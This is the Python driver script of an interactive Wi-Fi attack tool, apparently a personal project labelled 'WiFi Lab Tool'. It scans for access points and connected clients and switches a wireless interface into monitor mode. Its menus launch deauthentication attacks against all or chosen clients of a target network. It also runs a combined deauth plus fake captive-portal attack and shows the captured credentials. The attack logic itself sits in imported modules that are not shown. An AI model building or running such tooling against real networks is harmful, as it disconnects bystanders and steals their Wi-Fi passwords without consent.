#!/usr/bin/env python3

import sys
import time
import threading
import subprocess

from find_lucky_neighbours import WiFiScanner
from get_clients_disconnected import DeauthAttackManager
from data import WiFiNet, ClientDevice
from captive_portal import CaptivePortalAttack


scanner = None
deauth_manager = None
portal_attack = None

current_interface = None
scanning = False
deep_scanning = False
scan_thread = None
deep_scan_thread = None


def clear():
    """Czyści ekran w terminalu."""
    print("\033[H\033[J", end="")


def log(msg):
    """Prosty logger do konsoli."""
    print(msg)

def disable_network_services():
    """
    Wyłącza NetworkManagera i radio Wi-Fi na czas eksperymentu.
    Dzięki temu sterownik nie blokuje trybu monitor i zmiany kanałów.
    """
    try:
        log("Stopping NetworkManager and disabling Wi-Fi...")
        subprocess.run(["systemctl", "stop", "NetworkManager"], check=False)
        subprocess.run(["nmcli", "radio", "wifi", "off"], check=False)
    except Exception as e:
        log(f"Could not stop NetworkManager / Wi-Fi: {e}")

def enable_network_services():
    """
    Włącza NetworkManagera i radio Wi-Fi.
    Używane w cleanup(), żeby po pracy z donglem wszystko wróciło do normalnego stanu.
    """
    try:
        log("Starting NetworkManager and enabling Wi-Fi...")
        subprocess.run(["systemctl", "start", "NetworkManager"], check=False)
        subprocess.run(["nmcli", "radio", "wifi", "on"], check=False)
    except Exception as e:
        log(f"Could not start NetworkManager / Wi-Fi: {e}")


def select_interface():
    global scanner

    if scanner is None:
        log("Scanner not initialized.")
        return None

    ifaces = scanner.get_interfaces()
    if not ifaces:
        log("No WiFi interfaces found.")
        return None

    clear()
    log("=" * 60)
    log("WiFi Lab Tool")
    log("=" * 60)
    log("\nAvailable interfaces:\n")

    for i, iface in enumerate(ifaces, 1):
        log(f"{i}. {iface}")

    while True:
        choice = input("\nSelect interface (1-{}): ".format(len(ifaces))).strip()
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(ifaces):
                iface = ifaces[idx - 1]

                disable_network_services()

                log(f"\nSetting monitor mode on {iface}...")
                if scanner.set_monitor_mode(iface):
                    log("Monitor mode OK.\n")
                    return iface
                else:
                    log("Failed to set monitor mode.\n")
          
                    enable_network_services()
                    return None
        log("Invalid choice.")


def start_ap_discovery(iface):
    global scan_thread, scanning, scanner

    if scanner is None:
        log("Scanner not initialized.")
        return

    def scan_worker():
        scanner.start_ap_discovery(iface)

    scan_thread = threading.Thread(target=scan_worker, daemon=True)
    scan_thread.start()
    scanning = True
    log(f"AP Discovery started on {iface}...\n")


def stop_ap_discovery():
    global scanning, scanner

    if scanner is None:
        return

    if scanning:
        scanner.stop_scan()
        scanning = False
        log("AP Discovery stopped.\n")


def start_deep_scan(iface, bssid, channel):
    global deep_scan_thread, deep_scanning, scanner

    if scanner is None:
        log("Scanner not initialized.")
        return

    def deep_worker():
        scanner.lock_on_ap(iface, bssid, channel)

    deep_scan_thread = threading.Thread(target=deep_worker, daemon=True)
    deep_scan_thread.start()
    deep_scanning = True
    log(f"Deep scan started on {bssid} (CH {channel})...\n")


def stop_deep_scan():
    global deep_scanning, scanner

    if scanner is None:
        return

    if deep_scanning:
        scanner.deep_scanning = False
        deep_scanning = False
        log("Deep scan stopped.\n")


def show_ap_list():
    global scanner

    if scanner is None:
        log("Scanner not initialized.")
        return

    networks = scanner.get_network_list()
    if not networks:
        log("No networks found yet. Keep scanning...")
        time.sleep(1)
        return

    clear()
    log("=" * 100)
    log("DISCOVERED ACCESS POINTS")
    log("=" * 100)
    log(f"{'#':<3} {'SSID':<25} {'BSSID':<18} {'CH':<3} {'RSSI':<6} {'Vendor':<15} {'PMF':<8}")
    log("-" * 100)

    for idx, net in enumerate(networks[:20], 1):
        ssid = (net.ssid if net.ssid else "<Hidden>")[:25]
        vendor = net.vendor[:15] if net.vendor else "Unknown"
        pmf = "Yes" if net.rsn_pmf == "required" else "No"
        log(
            f"{idx:<3} {ssid:<25} {net.bssid:<18} "
            f"{net.channel:<3} {net.signal_dbm:<6} {vendor:<15} {pmf:<8}"
        )

    log("=" * 100)
    log(f"Total networks: {len(networks)}\n")


def select_ap():
    global scanner

    if scanner is None:
        log("Scanner not initialized.")
        return None

    networks = scanner.get_network_list()
    if not networks:
        log("No networks available.")
        time.sleep(1)
        return None

    page = 0
    per_page = 15

    while True:
        clear()
        total_pages = (len(networks) + per_page - 1) // per_page
        start_idx = page * per_page
        end_idx = start_idx + per_page
        page_networks = networks[start_idx:end_idx]

        log("=" * 100)
        log("DISCOVERED ACCESS POINTS")
        log("=" * 100)
        log(f"{'#':<3} {'SSID':<25} {'BSSID':<18} {'CH':<3} {'RSSI':<6} {'Vendor':<15} {'PMF':<8}")
        log("-" * 100)

        for idx, net in enumerate(page_networks, 1):
            ssid = (net.ssid if net.ssid else "<Hidden>")[:25]
            vendor = net.vendor[:15] if net.vendor else "Unknown"
            pmf = "Yes" if net.rsn_pmf == "required" else "No"
            log(
                f"{idx:<3} {ssid:<25} {net.bssid:<18} "
                f"{net.channel:<3} {net.signal_dbm:<6} {vendor:<15} {pmf:<8}"
            )

        log("=" * 100)
        log(f"Page {page + 1}/{total_pages}")
        log("Commands: [1-{}] Select | [n] Next | [p] Prev | [b] Back\n".format(len(page_networks)))

        choice = input("Select: ").strip().lower()

        if choice == "b":
            return None
        elif choice == "n":
            if page < total_pages - 1:
                page += 1
            continue
        elif choice == "p":
            if page > 0:
                page -= 1
            continue
        elif choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(page_networks):
                return page_networks[idx - 1]
            else:
                log("Invalid choice.")
                time.sleep(1)
                continue


def show_ap_info(network):
    global scanner

    if scanner is None:
        log("Scanner not initialized.")
        return

    clients = scanner.get_clients_for_ap(network.bssid)

    clear()
    log("=" * 70)
    log(f"AP INFO: {network.ssid if network.ssid else '<Hidden>'}")
    log("=" * 70)
    log(f"BSSID:       {network.bssid}")
    log(f"Channel:     {network.channel}")
    log(f"RSSI:        {network.signal_dbm} dBm")
    log(f"Clients:     {len(clients)}")
    log(f"Vendor:      {network.vendor}")
    log(f"PMF:         {network.rsn_pmf}\n")

    if clients:
        log("CONNECTED CLIENTS:")
        log("-" * 70)
        for idx, client in enumerate(clients, 1):
            log(f"{idx}. {client.mac} (RSSI: {client.signal_dbm} dBm)")
    else:
        log("No clients detected yet.")
        log("Tip: keep deep scan running for longer to catch more traffic.\n")


def ap_operations_menu(network):
    global scanner, deauth_manager, current_interface, deep_scanning

    if scanner is None or deauth_manager is None:
        log("Modules not initialized.")
        time.sleep(1)
        return

    while True:
        show_ap_info(network)

        log("1. Start deep client scan (lock on channel)")
        log("2. Deauth all clients")
        log("3. Deauth specific client")
        log("4. Captive Portal Attack")
        log("5. Export results")
        log("6. Back\n")

        choice = input("Select: ").strip()

        if choice == "1":
            if not deep_scanning:
                if current_interface is None:
                    log("No interface selected.")
                else:
                    start_deep_scan(current_interface, network.bssid, network.channel)
                    log("Deep scan running in background. Refresh to see new clients.\n")
                input("Press Enter...")
            else:
                log("Deep scan already running.")
                input("Press Enter...")

        elif choice == "2":
            clients = scanner.get_clients_for_ap(network.bssid)
            if not clients:
                log("No clients to deauth.")
            else:
                log(f"Starting deauth on {len(clients)} clients...")
                for client in clients:
                    deauth_manager.start_client_attack(
                        client.mac,
                        network.bssid,
                        current_interface,
                    )
                log("Deauth attacks started.")
            input("Press Enter...")

        elif choice == "3":
            clients = scanner.get_clients_for_ap(network.bssid)
            if not clients:
                log("No clients found.")
            else:
                log("Select client:")
                for idx, client in enumerate(clients, 1):
                    log(f"{idx}. {client.mac} (RSSI: {client.signal_dbm} dBm)")

                sel = input("\nSelect (or 'c' to cancel): ").strip()
                if sel.lower() != "c" and sel.isdigit():
                    idx = int(sel)
                    if 1 <= idx <= len(clients):
                        client = clients[idx - 1]
                        deauth_manager.start_client_attack(
                            client.mac,
                            network.bssid,
                            current_interface,
                        )
                        log("Deauth attack started.")
            input("Press Enter...")

        elif choice == "4":
            captive_portal_menu(network)

        elif choice == "5":
            filename = scanner.export_results()
            log(f"Exported to: {filename}\n")
            input("Press Enter...")

        elif choice == "6":
            break

        else:
            log("Invalid choice.")


def captive_portal_menu(network):
    global portal_attack, scanner, deauth_manager, current_interface

    if portal_attack is None or scanner is None or deauth_manager is None:
        log("Modules not initialized.")
        time.sleep(1)
        return

    while True:
        stats = portal_attack.get_stats()

        clear()
        log("=" * 60)
        log("CAPTIVE PORTAL ATTACK")
        log("=" * 60)
        log(f"Target: {network.ssid if network.ssid else '<Hidden>'}")
        log(f"Status: {'RUNNING' if stats['is_running'] else 'STOPPED'}")
        log(f"Credentials: {stats['total_credentials']}\n")

        log("1. Start attack (deauth + portal)")
        log("2. Show credentials")
        log("3. Stop attack")
        log("4. Back\n")

        choice = input("Select: ").strip()

        if choice == "1":
            target_ssid = network.ssid if network.ssid else "FreeWiFi"
            log(f"Starting deauth + portal for: {target_ssid}")

            clients = scanner.get_clients_for_ap(network.bssid)
            for client in clients:
                deauth_manager.start_client_attack(
                    client.mac,
                    network.bssid,
                    current_interface,
                )

            if portal_attack.start_portal(current_interface, target_ssid):
                log("Captive portal started!")
            else:
                log("Failed.")
            input("Press Enter...")

        elif choice == "2":
            try:
                with open(portal_attack.credentials_file, "r") as f:
                    content = f.read()
                    if content:
                        log("\nCAPTURED CREDENTIALS:")
                        log("-" * 40)
                        log(content)
                    else:
                        log("No credentials yet.")
            except FileNotFoundError:
                log("No credentials file.")
            input("Press Enter...")

        elif choice == "3":
            portal_attack.stop_portal()
            deauth_manager.stop_all_attacks()
            log("Stopped.")
            input("Press Enter...")

        elif choice == "4":
            break

        else:
            log("Invalid choice.")


def main_menu():
    global scanning, current_interface, scanner, deauth_manager, deep_scanning

    if scanner is None or deauth_manager is None:
        log("Modules not initialized.")
        return

    while True:
        clear()
        log("=" * 60)
        log("WiFi Tool(name in progress) ")
        log("=" * 60)

        networks = scanner.get_network_list()
        log(f"Interface: {current_interface if current_interface else 'None'}")
        log(f"Status:   {'DISCOVERING APs' if scanning else 'STOPPED'}")
        log(f"Deep scan:{'ON' if deep_scanning else 'OFF'}")
        log(f"Networks: {len(networks)}\n")

        log("1. Show AP list & select")
        log("2. Start/Stop AP discovery")
        log("3. Stop all attacks")
        log("4. Export results")
        log("5. Change interface")
        log("6. Exit\n")

        choice = input("Select: ").strip()

        if choice == "1":
            net = select_ap()
            if net:
                ap_operations_menu(net)

        elif choice == "2":
            if current_interface is None:
                log("No interface selected.")
                input("Press Enter...")
                continue

            if scanning:
                stop_ap_discovery()
            else:
                start_ap_discovery(current_interface)
            time.sleep(1)

        elif choice == "3":
            deauth_manager.stop_all_attacks()
            log("All attacks stopped.\n")
            input("Press Enter...")

        elif choice == "4":
            filename = scanner.export_results()
            log(f"Exported to: {filename}\n")
            input("Press Enter...")

        elif choice == "5":
            stop_ap_discovery()
            stop_deep_scan()
            deauth_manager.stop_all_attacks()
            if current_interface:
                scanner.restore_managed_mode(current_interface)
            iface = select_interface()
            if iface:
                current_interface = iface
                start_ap_discovery(iface)

        elif choice == "6":
            break

        else:
            log("Invalid choice.")


def cleanup():
    global current_interface, scanner, deauth_manager, portal_attack

    log("\nCleaning up...")
    stop_ap_discovery()
    stop_deep_scan()

    if deauth_manager is not None:
        deauth_manager.stop_all_attacks()

    if portal_attack and portal_attack.is_running:
        portal_attack.stop_portal()

    if scanner is not None and current_interface:
        log(f"Restoring {current_interface}...")
        scanner.restore_managed_mode(current_interface)

    enable_network_services()
    log("Done.\n")


def main():
    global scanner, deauth_manager, portal_attack, current_interface, scanning

    try:
        scanner = WiFiScanner(debug=True)
        deauth_manager = DeauthAttackManager(debug=True)
        portal_attack = CaptivePortalAttack()

        iface = select_interface()
        if not iface:
            log("No interface selected.")
            return

        current_interface = iface
        start_ap_discovery(iface)
        time.sleep(1)

        main_menu()

    except KeyboardInterrupt:
        log("\n\nInterrupted.")
    except Exception as e:
        log(f"\nError: {e}")
        import traceback
        traceback.print_exc()
    finally:
        cleanup()


if __name__ == "__main__":
    main()

